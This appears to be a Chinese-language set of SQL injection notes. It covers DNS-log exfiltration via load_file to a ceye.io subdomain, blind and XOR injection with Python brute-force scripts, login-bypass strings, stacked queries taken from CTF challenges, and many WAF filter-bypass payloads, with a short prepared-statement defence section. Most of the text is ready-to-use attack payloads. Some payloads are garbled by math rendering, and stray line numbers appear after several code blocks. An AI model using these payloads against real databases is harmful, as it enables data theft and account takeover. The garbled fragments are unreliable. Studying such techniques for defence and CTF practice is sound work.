<p>https://lyiang.wordpress.com/2015/06/09/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88gbk%E5%8F%8C%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87%EF%BC%89/</p>
<h2 id="dns注入">DNS注入</h2>
<p>在测试一些网站的时候，一些注入都是<code>无回显</code>的，所以我们一般会采用<code>盲注法，延时注入或布尔注入</code>，有些情况下布尔注入不可以使用，但是延时注入的时间又太慢，我们就会使用一种高效的方法—<code>DNS注入</code></p>
<p>DNS注入要求<br>
DNSlog盲注需要用的load_file()函数，所以一般得是root权限。show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>
<p>1、当secure_file_priv为空，就可以读取磁盘的目录。<br>
2、当secure_file_priv为G:\，就可以读取G盘的文件。<br>
3、当secure_file_priv为null，load_file就不能加载文件。</p>
<p>无论secure_file_priv 为任何属性均可以使用dns注入前提<br>
通过设置my.ini来配置。secure_file_priv=””就是可以load_flie任意磁盘的文件。<br>
数据库在配置中允许域名解析时，到数据库中查看：</p>
<pre><code>show variables like ‘skip_name_resolve’;
</code></pre>
<p>默认情况下MYSQL域名解析禁止 开关试off的 所以不需要担心</p>
<p>原理</p>
<p>DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息<br>
简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。</p>
<p>这样说原理很抽象，下面通过实际例子看下。</p>
<p><a href="http://ceye.io/">http://ceye.io</a> 这是一个免费的记录dnslog的平台，我们注册后到控制面板会给你一个二级域名：xxx.ceye.io,当我们把注入信息放到三级域名那里，后台的日志会记录下来</p>
<p>本地复现</p>
<p>首先去DNSlog网站获取一个子域名</p>
<pre><code>select load_file('\\\\aaaa.x1rzd3.ceye.io\\ddd');
</code></pre>
<p>查看Dnslog是否有解析信息</p>
<pre><code>select load_file(concat('\\\\',(select name from admin where id=1 ),'.x1rzd3.ceye.io\\ddd'));
</code></pre>
<p>为什么要\？</p>
<p>UNC路径，对指定的域名进行DNS查询，通过查询域名递归的方式，DNS服务器可以将返回数据通过DNS协议带出去。</p>
<pre><code>  PS：路径是windows下的特性，默认安装的linux下不存在这样的功能    
</code></pre>
<p>为什么要\？</p>
<p>\原本是两条 但经过解析只会变成一条所以 要进行转义变成\</p>
<pre><code> PS： 不可以.x1rzd3.ceye.io 还要.x1rzd3.ceye.io\乱写数字字母都可.x1rzd3.ceye.io\\fkjs
</code></pre>
<p>Payload</p>
<pre><code>select load_file(concat('\\\\'(select name from admin where id=1 ),'.x1rzd3.ceye.io\\ddd'));
</code></pre>
<p>参考链接：</p>
<p>https://blog.csdn.net/Auuuuuuuu/article/details/88082184</p>
<p>https://www.cnblogs.com/afanti/p/8047530.html</p>
<h2 id="insert注入">Insert注入</h2>
<p>布尔注入</p>
<pre><code>insert into admin(id,name) values ($ed,$user)
</code></pre>
<p>Payload<br>
<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mo>=</mo><mo>(</mo><mi>i</mi><mi>f</mi><mo>(</mo><mi>o</mi><mi>r</mi><mi>d</mi><mo>(</mo><mi>m</mi><mi>i</mi><mi>d</mi><mo>(</mo><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mo>(</mo><mo>)</mo><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo>)</mo><mo>)</mo><mo>&gt;</mo><mn>1</mn><mo separator="true">,</mo><mi>T</mi><mi>r</mi><mi>u</mi><mi>e</mi><mo separator="true">,</mo><mi>f</mi><mi>a</mi><mi>l</mi><mi>s</mi><mi>e</mi><mo>)</mo><mo>)</mo><mi>i</mi><mi>n</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>t</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>o</mi><mi>a</mi><mi>d</mi><mi>m</mi><mi>i</mi><mi>n</mi><mo>(</mo><mi>i</mi><mi>d</mi><mo separator="true">,</mo><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo>)</mo><mi>v</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mi>s</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">user = (if(ord(mid(database(),1,1))&gt;1,True,false))
insert into admin(id,name) values (</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mclose">)</span><span class="mclose">)</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mopen">(</span></span></span></span>ed,$user)</p>
<p>ID NAME<br>
A G E<br>
1 0 19<br>
2 1 34<br>
当name = 1 则为true 0为false<br>
多行注入</p>
<p>insert into admin(id,name) values (<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>e</mi><mi>d</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">ed,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">e</span><span class="mord mathdefault">d</span><span class="mpunct">,</span></span></span></span>user)<br>
Payload</p>
<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mo>=</mo><mn>1</mn><mi mathvariant="normal">）</mi><mo separator="true">,</mo><mo>(</mo><mn>1</mn><mo separator="true">,</mo><mi>a</mi><mi>d</mi><mi>m</mi><mi>i</mi><mi>n</mi><mo>)</mo><mo separator="true">,</mo><mo>(</mo><mn>2</mn><mo separator="true">,</mo><mi>h</mi><mi>a</mi><mi>c</mi><mi>k</mi><mi>e</mi><mi>r</mi><mo>)</mo><mi>i</mi><mi>n</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>t</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>o</mi><mi>a</mi><mi>d</mi><mi>m</mi><mi>i</mi><mi>n</mi><mo>(</mo><mi>i</mi><mi>d</mi><mo separator="true">,</mo><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo>)</mo><mi>v</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mi>s</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">user = 1）,(1,admin),(2,hacker)
insert into admin(id,name) values (</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord cjk_fallback">）</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">)</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mopen">(</span></span></span></span>ed,$user)</p>
<h2 id="delete注入">Delete注入</h2>
<h2 id="update注入">Update注入</h2>
<p>更改密码</p>
<p>类似更改密码也有可能出现漏洞</p>
<p>用户注册过程</p>
<p>第一次insert</p>
<p>用户想覆盖注册admin 但是系统通过后台校验禁止注册admin</p>
<p>用户注册一个名为hacker的用户名</p>
<p>更改密码</p>
<p>第二次update</p>
<p>update admin set password=’22222’ where name=’hacker’;</p>
<p>这是一个正常过程</p>
<p>入侵过程</p>
<p>用户注册了一个admin’#的账户</p>
<p>再修改密码过程中</p>
<p>update admin set password=’22222’ where name=’admin’#’;</p>
<p>在此过程出现了重置admin用户的漏洞</p>
<h1 id="攻击方法">攻击方法</h1>
<h2 id="异或注入">异或注入</h2>
<p>异或运算规则:<br>
<code>1^1=0 0^0=0 0^1=1</code><br>
<code>1^1^1=0 1^1^0=0</code><br>
构造payload:<code>'^ascii(mid(database(),1,1)=98)^0</code></p>
<pre><code class="language-mysql">^if((select(ascii(mid(group_concat(table_name),1,1))&gt;100)from(information_schema.tables)where(table_schema)like(0x6461696d6132)),1,0);
</code></pre>
<p>过滤了^</p>
<p>=“”</p>
<pre><code>&quot;0^&quot; + &quot;(ascii(substr((select(password)from(waf01)),{0},1))&gt;{1})&quot;.format(i,mid)
</code></pre>
<pre><code>0'(ascii((select(passwd)from(waf01))from(1))&gt;0)^'0
ascii()&gt;0
select(passwd)from(waf01))from(1)
</code></pre>
<pre><code class="language-python">import requests
import time

urls=&quot;http://opence.com/waf01/index.php?username=&quot;
a=&quot;&quot;
for i in range(1,10):
	for j in range(1,128):
		strs= &quot;0'^&quot; + &quot;(ascii(mid((passwd)from({0})))&gt;{1})&quot;.format(i,j)+&quot;^'0&quot;
		url=urls+strs
		html = requests.get(url)
		print(j)
		if &quot;username=admin&quot; in html.text:
			a=a+chr(j)
			print(a)
			break
print(a)



</code></pre>
<p>二分法代码</p>
<pre><code class="language-python">import requests
import time
urls=&quot;http://opence.com/waf01/index.php?username=&quot;
str=&quot;&quot;
min=32
max=128
for i in range(1,30):
    while min&lt;max:
        mid =(min+max)//2
        r=request.get(urls+payload)
        if admin in r.text:
            min=mid+1
        else:
            max=mid
     if mid!=32:
        str=str+chr(mid)
        print(str)
</code></pre>
<h2 id="万能密码">万能密码</h2>
<p>0x01未过滤<code>'</code></p>
<pre><code>数据库查询语句
select * from users where username='' and password='';
</code></pre>
<pre><code>username=' or 1=1#
</code></pre>
<p>0X02未过滤<code>\</code>但过滤<code>'</code></p>
<pre><code>数据库查询语句
select * from users where username='' and password='';
</code></pre>
<pre><code>用户名：admin\
密码：or 1 #     //等号也被过滤了

即构造了：select * from users where username='admin\' and password='or 1 #'

布尔注入脚本
select * from users where username='admin\' and password='^ (ascii(substr((password),%d,1))&gt;%d)#'
</code></pre>
<p>https://blog.csdn.net/qq_45521281/article/details/105810265</p>
<h2 id="利用预编译注入">利用预编译注入</h2>
<p><strong>黑名单绕过 concat 拼接语句</strong></p>
<pre><code class="language-mysql">//定义预编译语句
PREPARE a FROM preparable_stmt;

//执行预编译语句
EXECUTE a [USING @var_name [, @var_name] ...];

-1';PREPARE hacker from concat('select flag from `1919810931114514`');EXECUTE hacker;#
</code></pre>
<h2 id="handler查询"><strong>handler查询</strong></h2>
<p>mysql可以使用select查询表中的数据，也可使用handler语句，这条语句是一行一行的浏览一个表中的数据。<br>
<strong>handler可以用于MyISAM和InnoDB表。</strong><br>
使用方法：<br>
handler table_name open打开一张表<br>
handel table_name read first读取第一行内容，<br>
handel table_name read next依次获取其它行<br>
最后一行执行之后再执行handel table_name read next会返回一个空的结果。</p>
<pre><code>-1';handler `1919810931114514` open;handler `1919810931114514` read first;#
</code></pre>
<h2 id="基于约束的sql攻击">基于约束的SQL攻击</h2>
<p>https://blog.csdn.net/qq_41617034/article/details/106431679</p>
<p>挖洞可以使用，任意账号注册</p>
<pre><code class="language-php">示例
&lt;?php
$username = mysql_real_escape_string($_GET['username']);
$password = mysql_real_escape_string($_GET['password']);
$query = &quot;SELECT *
          FROM users
          WHERE username='$username'&quot;;
$res = mysql_query($query, $database);
if($res) {
  if(mysql_num_rows($res) &gt; 0) {
  }
  else {
    $query = &quot;INSERT INTO users(username, password)
              VALUES ('$username','$password')&quot;;
</code></pre>
<p>主要原理就是insert时候有varchar(n)的限制，大于n的时候会截取前n个存入。</p>
<p>在数据库对字符串进行比较时，即select操作，如果两个字符串的长度不一样，则会将<strong>较短的字符串末尾填充空格</strong></p>
<p>修复：</p>
<p>预防手段<br>
1：唯一性。查询结果大于1查询不成立。<br>
2.对输入的长度进行限制。<br>
3.使用id作为主键。<br>
4.使用最新版本的mysql（5.7.17）已经无效，已经修复。</p>
<p>基于无列名注入</p>
<h2 id="无列名注入">无列名注入</h2>
<p>原理</p>
<pre><code>select id,username from admin 
select * from admin 

=select `3` from (selct 1,2 union select * from admin )a
=select b from (selct 1,2 as b union select * from admin )a
末尾的 a 可以是任意字符，用于命名。
</code></pre>
<p>https://zhuanlan.zhihu.com/p/98206699</p>
<h1 id="防御">防御</h1>
<p>建议参考一下内容</p>
<p>https://blog.csdn.net/huanghelouzi/article/details/82995313</p>
<p>https://blog.csdn.net/a15803617402/article/details/82789477</p>
<h3 id="预编译防止注入">预编译防止注入</h3>
<pre><code>MySQL执行预编译分为如三步：

执行预编译语句，例如：prepare myfun from 'select * from t_book where bid=?'
设置变量，例如：set @str='b1'
执行语句，例如：execute myfun using @str
</code></pre>
<p>1.连接数据库（mysqli）</p>
<pre><code class="language-php">$username=&quot;root&quot;;
$password=&quot;root&quot;;
$localhost=&quot;127.0.0.1&quot;;
$db=&quot;daima&quot;;

$conn=mysqli_connect($localhost,$username,$password,$db);
#查询
$sql=&quot;select Np,Nr from jms_admin where id=?&quot;;
$stmt=$conn-&gt;prepare($sql);
$id=1;
$stmt-&gt;bind_param(&quot;i&quot;,$id);
$stmt-&gt;excute();
$stmt-&gt;bind_result($Np);



</code></pre>
<h2 id="ctf题目">CTF题目</h2>
<p>堆叠注入</p>
<p>绕过黑名单限制</p>
<p>buuctf-&gt;easysql</p>
<p>https://blog.csdn.net/weixin_44037296/article/details/105190639</p>
<p>https://blog.csdn.net/qq_43428139/article/details/105774751</p>
<p>https://www.cnblogs.com/Vinson404/p/7253255.html</p>
<p>关键词过滤</p>
<h2 id="sql入绕过">sql入绕过</h2>
<h3 id="关键字绕过">关键字绕过</h3>
<h4 id="大小写绕过">大小写绕过</h4>
<p>常用于 <code>waf</code>的正则对大小写不敏感的情况，一般都是题目自己故意这样设计。<br>
例如：waf过滤了关键字<code>select</code>，可以尝试使用<code>Select</code>等绕过。</p>
<pre><code class="language-sql">mysql&gt; select * from users where id = -1 union select 1,2,3
mysql&gt; select * from users where id = -1 union Select 1,2,3;
</code></pre>
<h4 id="内联注释绕过">内联注释绕过</h4>
<p>内联注释就是把一些特有的仅在MYSQL上的语句放在 <code>/*!...*/</code> 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。</p>
<pre><code class="language-sql">mysql&gt; select * from users where id = -1 union /*!select*/ 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | 3        |
+----+----------+----------+
</code></pre>
<h4 id="双写关键字绕过">双写关键字绕过</h4>
<p>在某一些简单的<code>waf</code>中，将关键字<code>select</code>等只使用<code>replace()</code>函数置换为空，这时候可以使用双写关键字绕过。例如<code>select</code>变成<code>seleselectct</code>，在经过<code>waf</code>的处理之后又变成<code>select</code>，达到绕过的要求。</p>
<h4 id="特殊编码绕过">特殊编码绕过</h4>
<ul>
<li>十六进制绕过</li>
</ul>
<pre><code class="language-sql">mysql&gt; select * from users where username = 0x7465737431;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | test1    | pass     |
+----+----------+----------+
123456
</code></pre>
<ul>
<li>ascii编码绕过<br>
<code>Test</code> 等价于<br>
<code>CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</code><br>
tip:好像新版mysql不能用了</li>
</ul>
<h4 id="绕过">&lt;&gt;绕过:</h4>
<pre><code class="language-mysql">unio&lt;&gt;n sel&lt;&gt;ect(可能是有些网站为了防止xss注入,所以过滤了&lt;&gt;,参照i春秋sql)
</code></pre>
<h2 id="关键词替换">关键词替换</h2>
<h3 id="注释符号绕过">注释符号绕过</h3>
<p>常用的注释符有</p>
<pre><code>-- 注释内容
# 注释内容
/*注释内容*/\
;
</code></pre>
<h3 id="空格过滤绕过">空格过滤绕过</h3>
<p>一般绕过空格过滤的方法有以下几种方法来取代空格</p>
<pre><code class="language-mysql">/**/
()
回车(url编码中的%0a)
`(tap键上面的按钮)
tap
两个空格
%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/
</code></pre>
<h4 id="无需空格注入">无需空格注入</h4>
<pre><code class="language-mysql">查询表名

admin'union(select(table_name),(2),(3)from(information_schema.tables)where(table_schema=0x74657374))#

查询列名
admin'union((select(column_name),(2),(3)from(information_schema.columns)where(table_schema=0x74657374)and(table_name=0x75736572)))#

查询数据
admin'union(select(username),(password),(3)from(user))#

获取表名
admin'and(select(ascii(mid(group_concat(table_name),1,1))=116)from(information_schema.columns)where(table_schema=0x74657374))#

获取字段名
admin'and(select(ascii(mid(group_concat(column_name),1,1))=73)from(information_schema.columns)where(table_schema=0x74657374)and(table_name=0x75736572))#

#时间盲注获取数据库名称
admin'and(if((ascii(mid(database(),1,1))=116),sleep(5),0))#

#布尔注入
^if((select(ascii(mid(group_concat(table_name),1,1))&gt;100)from(information_schema.tables)where(table_schema)like(0x6461696d6132)),1,0);
</code></pre>
<h3 id="过滤or-and-xor-not-绕过">过滤or and xor not 绕过</h3>
<pre><code class="language-mysql">and = &amp;&amp;
or = ||
xor = | # 异或
not = !
</code></pre>
<h3 id="过滤等号绕过">过滤等号=绕过</h3>
<ul>
<li>不加<code>通配符</code>的<code>like</code>执行的效果和<code>=</code>一致，所以可以用来绕过。</li>
</ul>
<p>正常加上通配符的<code>like</code>：</p>
<pre><code class="language-sql">mysql&gt; select * from users where username like &quot;test%&quot;;
</code></pre>
<p>不加上通配符的<code>like</code>可以用来取代<code>=</code>：</p>
<pre><code class="language-sql">mysql&gt; select * from users where id like 1;
</code></pre>
<ul>
<li>rlike:模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来<br>
用来取代<code>=</code>时，<code>rlike</code>的用法和上面的<code>like</code>一样，没有通配符效果和<code>=</code>一样</li>
</ul>
<pre><code class="language-sql">mysql&gt; select * from users where id rlike 1;
</code></pre>
<ul>
<li>regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配</li>
</ul>
<pre><code class="language-sql">mysql&gt; select * from users where id regexp 1;
</code></pre>
<ul>
<li>使用大小于号来绕过</li>
</ul>
<pre><code class="language-sql">mysql&gt; select * from users where id &gt; 1 and id &lt; 3;
</code></pre>
<ul>
<li>&lt;&gt; 等价于 !=<br>
所以在前面再加一个<code>!</code>结果就是等号了</li>
</ul>
<pre><code class="language-sql">mysql&gt; select * from users where !(id &lt;&gt; 1);
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | test1    | pass     |
+----+----------+----------+
1 row in set (0.00 sec)

</code></pre>
<p>等号绕过也可以使用strcmp(str1,str2)函数、between关键字等，具体可以参考后面的<code>过滤大小于号绕过</code></p>
<h3 id="过滤大小于号绕过">过滤大小于号&lt;&gt;绕过</h3>
<p>在sql盲注中，一般使用大小于号来判断ascii码值的大小来达到爆破的效果。但是如果过滤了大小于号的话，那就凉凉。怎么会呢，可以使用以下的关键字来绕过</p>
<ul>
<li>greatest(n1, n2, n3…):返回n中的最大值</li>
</ul>
<pre><code class="language-sql">mysql&gt; select * from users where id = 1 and greatest(ascii(substr(username,1,1)),1)=116;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | test1    | pass     |
+----+----------+----------+
</code></pre>
<ul>
<li>least(n1,n2,n3…):返回n中的最小值</li>
<li>strcmp(str1,str2):若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1</li>
</ul>
<pre><code class="language-sql">mysql&gt; select * from users where id = 1 and strcmp(ascii(substr(username,1,1)),117);
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | test1    | pass     |
+----+----------+----------+
1 row in set (0.00 sec)

mysql&gt; select * from users where id = 1 and strcmp(ascii(substr(username,1,1)),116);
Empty set (0.00 sec)
12345678910
</code></pre>
<ul>
<li>in关键字</li>
</ul>
<pre><code class="language-sql">mysql&gt; select * from users where id = 1 and substr(username,1,1) in ('t');
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | test1    | pass     |
+----+----------+----------+
1 row in set (0.01 sec)

mysql&gt; select * from users where id = 1 and substr(username,1,1) in ('y');
Empty set (0.00 sec)
12345678910
</code></pre>
<ul>
<li>between a and b:范围在a-b之间</li>
</ul>
<pre><code class="language-sql">mysql&gt; select * from users where id between 1 and 2;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | test1    | pass     |
|  2 | user2    | pass1    |
+----+----------+----------+
2 rows in set (0.00 sec)

mysql&gt; select * from users where id = 1 and substr(username,1,1) between 'a' and 'b';
Empty set (0.00 sec)

mysql&gt; select * from users where id = 1 and substr(username,1,1) between 'a' and 't';
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | test1    | pass     |
+----+----------+----------+
1 row in set (0.00 sec)
12345678910111213141516171819
</code></pre>
<p>使用between a and b判等</p>
<pre><code class="language-sql">mysql&gt; select * from users where id = 1 and substr(username,1,1) between 't' and 't';
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | test1    | pass     |
+----+----------+----------+
123456
</code></pre>
<h3 id="过滤引号绕过">过滤引号绕过</h3>
<ul>
<li>使用十六进制</li>
</ul>
<pre><code class="language-sql">select column_name  from information_schema.tables where table_name=0x7573657273;
1
</code></pre>
<ul>
<li>宽字节</li>
</ul>
<p>常用在web应用使用的字符集为<code>GBK</code>时，并且过滤了引号，就可以试试宽字节。</p>
<pre><code class="language-mysql"># 过滤单引号时
%bf%27 %df%27 %aa%27
12
%df\’ = %df%5c%27=縗’
1
</code></pre>
<h3 id="过滤逗号绕过">过滤逗号绕过</h3>
<p>sql盲注时常用到以下的函数：</p>
<pre><code class="language-sql">- substr()
  - substr(string, pos, len):从pos开始，取长度为len的子串
  - substr(string, pos):从pos开始，取到string的最后
  
- substring()
  - 用法和`substr()`一样
  
- mid()
  - 用法和`substr()`一样，但是`mid()`是为了向下兼容`VB6.0`，已经过时，以上的几个函数的pos都是从1开始的
  
- left()和right()
  - left(string, len)和right(string, len):分别是从左或从右取string中长度为len的子串
  
- limit
  - limit pos len:在返回项中从pos开始去len个返回值，pos的从0开始
  
- ascii()和char()
  - ascii(char):把char这个字符转为ascii码
  - char(ascii_int):和ascii()的作用相反，将ascii码转字符
</code></pre>
<p>回到正题，如果waf过滤了逗号，并且只能盲注（盲注基本离不开逗号啊喂），在取子串的几个函数中，有一个替代逗号的方法就是使用<code>from pos for len</code>，其中pos代表从pos个开始读取len长度的子串<br>
例如在<code>substr()</code>等函数中，常规的写法是</p>
<pre><code class="language-sql">mysql&gt; select substr(&quot;string&quot;,1,3);
+----------------------+
| substr(&quot;string&quot;,1,3) |
+----------------------+
| str                  |
+----------------------+
123456
</code></pre>
<ul>
<li>如果过滤了逗号，可以这样使用<code>from pos for len</code>来取代</li>
</ul>
<pre><code class="language-sql">mysql&gt; select substr(&quot;string&quot; from 1 for 3);
+-------------------------------+
| substr(&quot;string&quot; from 1 for 3) |
+-------------------------------+
| str                           |
+-------------------------------+
1 row in set (0.00 sec)
1234567
</code></pre>
<p>在sql盲注中，如果过滤逗号，以下参考下面的写法绕过</p>
<pre><code>mysql&gt; select ascii(substr(database() from 1 for 1)) &gt; 120;
+----------------------------------------------+
| ascii(substr(database() from 1 for 1)) &gt; 120 |
+----------------------------------------------+
|                                            0 |
+----------------------------------------------+
1 row in set (0.00 sec)

mysql&gt; select ascii(substr(database() from 1 for 1)) &gt; 110;
+----------------------------------------------+
| ascii(substr(database() from 1 for 1)) &gt; 110 |
+----------------------------------------------+
|                                            1 |
+----------------------------------------------+
1234567891011121314
</code></pre>
<ul>
<li>也可使用<code>join</code>关键字来绕过</li>
</ul>
<pre><code class="language-sql">mysql&gt; select * from users  union select * from (select 1)a join (select 2)b join(select 3)c;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | test1    | pass     |
|  2 | user2    | pass1    |
|  3 | test3    | pass1    |
|  1 | 2        | 3        |
+----+----------+----------+
123456789
</code></pre>
<p>其中的</p>
<pre><code class="language-sql">union select * from (select 1)a join (select 2)b join(select 3)c
</code></pre>
<p>等价于</p>
<pre><code class="language-sql">union select 1,2,3
</code></pre>
<ul>
<li>使用<code>like</code>关键字<br>
适用于<code>substr()</code>等提取子串的函数中的逗号</li>
</ul>
<pre><code class="language-sql">mysql&gt; select ascii(substr(user(),1,1))=114;
+-------------------------------+
| ascii(substr(user(),1,1))=114 |
+-------------------------------+
|                             1 |
+-------------------------------+

mysql&gt; select user() like &quot;r%&quot;;
+------------------+
| user() like &quot;r%&quot; |
+------------------+
|                1 |
+------------------+

mysql&gt; select user() like &quot;t%&quot;;
+------------------+
| user() like &quot;t%&quot; |
+------------------+
|                0 |
+------------------+
1234567891011121314151617181920
</code></pre>
<ul>
<li>使用offset关键字<br>
适用于<code>limit</code>中的逗号被过滤的情况<br>
<code>limit 2,1</code>等价于<code>limit 1 offset 2</code></li>
</ul>
<pre><code class="language-sql">mysql&gt; select * from users limit 2,1;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  3 | test3    | pass1    |
+----+----------+----------+

mysql&gt; select * from users limit 1 offset 2;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  3 | test3    | pass1    |
+----+----------+----------+
12345678910111213
</code></pre>
